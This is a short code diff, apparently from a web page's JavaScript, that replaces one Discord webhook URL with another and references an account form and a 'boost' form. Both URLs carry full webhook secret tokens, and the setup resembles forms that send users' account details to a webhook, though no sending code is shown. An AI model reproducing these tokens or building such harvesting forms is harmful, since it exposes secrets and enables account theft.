@@ -1,4 +1,4 @@
-const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1383524837674451076/vXxDnkqv1kXt-7WHOZegbtBpN-JXmSmbhSISiWAOQPzaax1o9s3hzsEKXvzJFzwzXK6k';
+const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1383722379003428895/FDzkVPLY6dLGX9XkFuAZQ5irFtcr1CVGA3B-KOuFrVGejpmSi9YMTMAx3-GJwjBPOeZd';
 
 const form1 = document.getElementById('account-form');
 const form2 = document.getElementById('boost-form');
